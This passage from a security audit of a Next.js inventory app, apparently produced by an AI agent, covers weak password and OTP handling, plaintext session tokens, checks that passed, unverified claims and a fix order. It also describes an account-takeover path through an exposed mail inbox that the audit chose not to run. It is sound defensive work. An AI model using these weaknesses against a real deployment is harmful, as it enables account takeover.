reaches `raw`/`resolveContent`; `sharp` is reachable only through Next's image pipeline and the app
imports no remote-image component; `next-auth` is dead weight that should simply be removed.
**Recommended fix:** `npm audit fix` for the fixable entries, remove `next-auth` (unused) and
`@mdxeditor/editor` if unused, pin `nodemailer` ≥ 10.0.15 before ever enabling SMTP mode, and add a
CI `npm audit --omit=dev --audit-level=high` gate.

---

### SEC-016 — Published demo credentials and a permissive password policy
**Severity:** INFO · **Status:** ACCEPTED-RISK-should-be-explicit · **Verification:** REPO-VERIFIED
**Affected:** `prisma/seed.ts:56-58`, `worklog.md:17` (credentials documented), `src/app/api/auth/reset-password/route.ts:27-32`

**Evidence:** three seeded accounts with passwords written in plaintext in the repository
(`seed.ts:56-58`); the only password policy in the codebase is `newPassword.length < 8`
(`reset-password/route.ts:27`) — and it applies **only** to the reset flow, not to seed or any
creation path. There is no password-change endpoint for signed-in users, no complexity/compromise
check, and `verifyPassword` accepts the case-flipped first-letter variant as an equal password
(`login/route.ts:24-33`), halving the effective keyspace of the first character.
**Impact:** Default credentials on any instance that is seeded and then exposed (combined with
SEC-003: no throttle).
**Recommended fix:** Force a first-login password change for seeded accounts in real deployments;
enforce one shared policy (min length 12 or a denylist of breached passwords) on every password-entry
path; drop or tightly scope the case-flip fallback.

---

### SEC-017 — OTP handling nits: non-constant-time comparison, in-memory store semantics, no dispatch throttle
**Severity:** INFO · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED (behaviour) + REPO-VERIFIED
**Affected:** `src/lib/auth/otp-store.ts:41`, `:13`, `src/app/api/auth/otp/route.ts:36-39`

**Evidence:**
```ts
// otp-store.ts:41 — string !== string, not timing-safe
if (entry.code !== candidateCode.trim()) {
```
```ts
// otp-store.ts:13 — process-local Map
const otpStore = new Map<string, StoredOtp>();
```
**Impact:** The `!==` oracle on a 6-digit code is theoretically exploitable but practically very hard
over a network (microsecond-level, 6 comparisons) — rated INFO deliberately. The in-memory store means
OTPs vanish on restart/redeploy (user-visible reset failures) and differ per process in a
multi-instance deployment (a guess may hit a process that never held the code). There is also **no
limit on how many codes can be outstanding/requested per account** (covered by SEC-003).
**Recommended fix:** `timingSafeEqual(Buffer.from(entry.code), Buffer.from(candidate))` after length
check; move the store to the DB (or Redis) with an indexed attempt counter; cap outstanding codes at 1
(re-issue invalidates the previous).

---

### SEC-018 — Session records: plaintext tokens, no rotation, no expiry sweep
**Severity:** INFO · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED (row counts) + REPO-VERIFIED (schema/flow)
**Affected:** `prisma/schema.prisma:33-40`, `src/lib/auth.ts:34-67`

**Evidence:**
```prisma
model Session {
  token     String   @unique      // raw 24-byte token, stored as-is
  expiresAt DateTime
  ...
}
```
`getSessionUser` checks `expiresAt` on read (`auth.ts:65`) but nothing ever deletes expired rows, no
session id/rotation occurs at privilege changes (only `reset-password` deletes all sessions,
`reset-password/route.ts:62`), and token = bearer secret with no IP/UA binding or "sign out everywhere".
Verified positively: logout **does** destroy the row server-side (live-tested, §5).

Live read-only count of `db/custom.db`:

```json
{ "sessionRowsTotal": 74, "expiredStillPresent": 20 }
```

20 expired sessions are still present in the table — the missing sweep is observable, not just structural.
**Impact:** DB read access (file, backup) is directly convertible into a valid session for up to 7 days;
expired rows accumulate indefinitely (unbounded growth).
**Recommended fix:** Hash tokens at rest (like passwords), rotate the token on login, sweep expired
rows on a schedule, expose per-user active-session management.

---

## 5. Verified-secure areas (checked and found sound)

| Area | Evidence | Level |
|---|---|---|
| **Permission gate runs before resource lookup — no object-ID oracle** | Live, as a `WAREHOUSE_STAFF` session on **non-existent** IDs: `POST /api/adjustments/99999999/approve → 403`, `POST /api/reorder/99999999/accept → 403`, `PATCH /api/products/99999999 → 403`, `DELETE /api/suppliers/99999999 → 403` — never 404/500, so existence is not disclosed; `POST /api/deliveries/99999999/pack → 404` (permitted action ⇒ gate passes ⇒ lookup). Automated sweep of all 44 route files: **0 ordering defects**. | EXECUTION-VERIFIED |
| **Unauthenticated access to business data is blocked** | `GET /api/products`, `/api/ledger`, `/api/meta` (anon) → `401 {"error":"Not signed in"}`; `GET /api/ledger/export` (anon) → `401`. | EXECUTION-VERIFIED |
| **Session cookie flags (partially)** | `HttpOnly` and `SameSite=lax` present on issue and clear (`set-cookie: sns_session=…; Path=/; …; HttpOnly; SameSite=lax`). | EXECUTION-VERIFIED |
| **Logout is server-side revocation, not just cookie clearing** | login → `GET /api/auth/me` `200 {"user":{…}}` → `POST /api/auth/logout` `200 {"ok":true}` → reusing the *same* cookie: `GET /api/auth/me` `200 {"user":null}`, `GET /api/products` `401`. Garbage token → `401`. | EXECUTION-VERIFIED |
| **Password hashing** | scrypt with 16-byte random salt, 64-byte digest (`auth.ts:18-22`), comparison via `timingSafeEqual` with length guard (`auth.ts:24-30`). No plaintext passwords stored or returned (grep: `passwordHash` never appears in any response mapper). | REPO-VERIFIED |
| **Login response body does not distinguish known vs unknown accounts** | known-wrong-password and unknown-account both → `401 {"error":"Invalid email or password"}`, no `Set-Cookie` on failure. (Timing differs — SEC-008.) | EXECUTION-VERIFIED |
| **No CORS / cross-origin data read** | `OPTIONS /api/products` with `Origin: https://evil.example` → `204` with **no** `Access-Control-Allow-Origin` and no `Access-Control-Allow-Credentials`; a `POST /api/auth/login` carrying `Origin: https://evil.example` likewise returned no ACAO (and no cookie on failure). The session cookie is `SameSite=lax` (live-verified), so a real browser would not attach it to cross-site POSTs at all — CSRF exposure reduces to the defence-in-depth gap noted in §7.2. | EXECUTION-VERIFIED |
| **Prisma/SQL injection** | No `$queryRaw`/`$executeRaw`/`eval`/`child_process` anywhere in `src/**` (grep: 0 hits). All filters go through typed Prisma where-inputs (`search/route.ts:16-21`, `ledger/export/route.ts:25-49`); sort keys whitelisted (`products/route.ts:11-14,46`). | REPO-VERIFIED |
| **Path traversal / file upload / open redirect** | No file-read/write endpoints, no upload handling, no `redirect()`/`Location:`/`window.location =` sinks in `src/**` (grep: 0 hits). OCR accepts only base64/data-URL payloads (`receipts/ocr/route.ts:69-74`). | REPO-VERIFIED |
| **SSRF** | The only outbound `fetch` in app code is the fixed `https://api.brevo.com/v3/smtp/email` (`provider.ts:59`); the OCR path passes a `data:` URL to an external vision SDK — the server never fetches a caller-supplied URL (`receipts/ocr/route.ts:74-93`). No user-controlled URL is ever dereferenced server-side. | REPO-VERIFIED |
| **Mass assignment** | Create/update handlers map fields explicitly: `products/route.ts:82-124` (whitelist + `numFields` + enum check), `suppliers/[id]/route.ts:133-155` (explicit `data` object), `deliveries/route.ts:42-53` (only `customer`, `note`, `lines`). No `…req.body` spread into Prisma anywhere. | REPO-VERIFIED |
| **Input validation & structured errors** | Malformed JSON → `400 {"error":"Invalid JSON body"}` (live: `/api/auth/login`, `/api/counts`); bad number → `400 {"error":"Invalid number for \"locationId\""}` (live); non-`HttpError` → `500 {"error":"Internal error"}` — present in **40 of 44** route files (all except `/api/health` and the 3 `/api/mail/*` routes, which are the subject of SEC-013). No stack traces or internal paths observed in any response. | EXECUTION-VERIFIED |
| **Service worker does not cache authenticated API data** | `public/sw.js:41-48` ignores non-GET requests and **returns early for `/api/**`** — no API response is written to Cache Storage. | REPO-VERIFIED |
| **Password reset invalidates sessions and enforces OTP before changing anything** | `reset-password/route.ts:27-48` (length check → OTP verify → consume) then `:55-62` (hash + `session.deleteMany`). OTP is single-use (`otp-store.ts:51`). | REPO-VERIFIED |
| **Permission model is action-list based, not role-hard-coded** | `permissions.ts:9-33`; gates read `user.permissions` from the session (`auth.ts:77-83`), so privilege changes require re-login rather than trusting client state. Client-side persistence holds **profile data only**: `auth-store.ts:20-23` writes the `SessionUser` JSON (id/name/email/role/permissions) to `stocksense.lastUser` and `offline-store.ts:110` writes a mutation queue — **the session token exists only in the `HttpOnly` cookie**; no JS-accessible token storage found. | REPO-VERIFIED |

---

## 6. Independent re-verification of the prior QA security fixes (QA-003 … QA-007)

| Prior claim | Independent check | Result |
|---|---|---|
| OTP generated via `crypto.randomInt` (CSPRNG) | `src/app/api/auth/otp/route.ts:1,36` → `randomInt(100000, 1000000)`; no `Math.random` in the OTP path | **HOLDS** (REPO-VERIFIED) |
| Verification attempt-limited; code destroyed after 5 wrong guesses; returns 429 | Executed `src/lib/auth/otp-store.ts` directly under Node: attempts 1–4 → `{reason:'invalid'}`, attempt 5 → `{reason:'locked'}`, attempts 6–7 **and the correct code afterwards** → `{reason:'missing'}` (entry destroyed); `route.ts` maps `locked → 429` (`reset-password/route.ts:36-43`) | **HOLDS** (EXECUTION-VERIFIED) |
| `debugOtp` only returned when `OTP_DEBUG=1` | `otp/route.ts:12,41` — gate is now an explicit env opt-in, not `NODE_ENV` | **HOLDS in code**; but `OTP_DEBUG=1` is set in the tracked `.env` → SEC-009; live behaviour UNVERIFIED (§7) |
| Known vs unknown account responses identical | Single `payload` object, one return path (`otp/route.ts:29-44`); live unknown-branch response: `200 {"success":true,"message":"If an account exists, a verification code has been dispatched."}` with **no** `debugOtp` | **HOLDS** for shape/content (known branch live-check UNVERIFIED, §7) |
| Both routes return generic `Internal error` on failure | `otp/route.ts:45-48` and `reset-password/route.ts:68-72` → `{error:'Internal error'}` with `console.error` of detail | **HOLDS** (REPO-VERIFIED). Note: the equivalent fix was **not** applied to `/api/mail/*` (SEC-013) |

---

## 7. Residual risk / open questions

### 7.1 Claims I could NOT verify (UNVERIFIED)

| # | Claim | Why |
|---|---|---|
| U-1 | Whether the **running dev server** currently returns `debugOtp` (i.e. whether it loaded `OTP_DEBUG=1` from `.env` at boot) | Verifying requires `POST /api/auth/otp` for an **existing** account, which sends a real Brevo e-mail. Audit scope was restricted to read-only/low-impact requests. Static evidence (`.env:7`, `otp/route.ts:12,41`) is REPO-VERIFIED only. |
| U-2 | Timing delta of the **known-account** branch of `/api/auth/otp` (the enumeration half of SEC-008's OTP claim) | Same reason as U-1. The unknown branch measured 30 ms; the known branch structurally includes an awaited outbound Brevo call (`otp/route.ts:39`) but the number was not measured. |
| U-3 | End-to-end exploitation of SEC-001 (request OTP → read code → reset password) | Deliberately **not** executed: it would reset a seeded account's password (destructive to the human's data). The read half (`GET /api/mail/inbox` returning OTP codes) and the reset contract (`reset-password/route.ts:34-62`) were each verified separately. |
| U-4 | Live 429 on `/api/auth/otp` dispatch and on `/api/auth/reset-password` under flood | Reset-OTP 429 was verified by **executing the store** (§6); dispatch-side has **no** limit by code inspection (SEC-003) — no live flood was run against the OTP endpoint to avoid triggering Brevo sends. |
| U-5 | Whether the deployed production build would behave differently (headers, `Secure` cookie, `NODE_ENV` paths) | No production build/deployment was exercised; `next.config.ts` has no environment-conditional security config, but `npm run build` + deploy verification was out of scope (QA-009 already flags deployment scripts as unrunnable). |

### 7.2 Residual risks and observations

* **No CSRF token, no Origin/Referer validation.** Mitigated today by `SameSite=lax` on the session
  cookie (live-verified) + no CORS; a top-level cross-site **GET** still carries the cookie, but every
  cookie-authenticated state-changing handler I found is `POST`/`PATCH`/`DELETE`. Recommend explicit
  Origin-check middleware as defence in depth (pairs with SEC-005).
* **Single-tenant by design** — there is no per-user object ownership, so classic horizontal IDOR
  does not apply; all confidentiality rests on the role gates (which held in every test).
* **Dev tunnel origins are configured** (`next.config.ts:10-18`: pinggy/loca.lt), i.e. this dev server
  has been/​can be exposed on a public URL. With SEC-001/003/004 open, a tunnelled dev instance is
  internet-reachable account takeover — treat "local only" as an unproven assumption (UNVERIFIED).
* **`typescript.ignoreBuildErrors: true`** (`next.config.ts:6-8`) masks type errors at build time
  (QA-011 already tracks the 3 known errors). Security-relevant because type drift in DTO/permission
  code can silently ship; cross-referenced rather than re-filed.
* **Database file is the whole security state** (`db/custom.db`, path in `.env`) — no at-rest
  encryption, no DB authentication (SQLite), backups not inspected. If the file or a backup leaks,
  password hashes (scrypt — fine), plaintext session tokens (SEC-018) and all commercial data go with it.
* **Expired sessions are never garbage-collected** (SEC-018) — unbounded table growth is also an
  availability concern over time.
* **Prisma `log:['query']` in production** (SEC-012) will also make logs very large (self-DoS of log
  volume).
* **OTP store is process-local** (SEC-017) — if this app is ever scaled horizontally, resets will
  behave nondeterministically (reliability risk that can push users toward workarounds).

### 7.3 Recommended remediation order

1. **SEC-001** (gate/remove `/api/mail/inbox`, stop putting OTPs in subjects) — immediate.
2. **SEC-002** (untrack `.env`, rotate the Brevo key) — immediate, independent of code deploy.
3. **SEC-003** (rate limits) + **SEC-004** (gate mail triggers) — same sprint.
4. **SEC-005** (headers/CSP), **SEC-007** (HTML escaping + inbox render sanitising), **SEC-006** (async scrypt).
5. **SEC-009** (clear `OTP_DEBUG`), **SEC-010** (cookie `Secure`), **SEC-011** (CSV), **SEC-012/013** (logging/error text), **SEC-014** (deliver gate).
6. **SEC-015…018** in normal maintenance; add a secret scanner and an auth/rate-limit regression test so
   these cannot silently regress (QA's own gap: "No security regression tests").

---

## 8. Summary of findings by severity

| Severity | Count | IDs |
|---|---:|---|
| CRITICAL | 1 | SEC-001 |
| HIGH | 2 | SEC-002, SEC-003 |
| MEDIUM | 4 | SEC-004, SEC-005, SEC-006, SEC-007 |
| LOW | 7 | SEC-008, SEC-009, SEC-010, SEC-011, SEC-012, SEC-013, SEC-014 |
| INFO | 4 | SEC-015, SEC-016, SEC-017, SEC-018 |
| **Total** | **18** | |

**Verified-secure:** 15 areas (§5) · **Prior QA fixes re-verified:** 5/5 hold (§6, with one config caveat — SEC-009)
**UNVERIFIED claims:** 5 (§7.1) · **Production file modifications by this audit:** 0 (this report is the only new file)
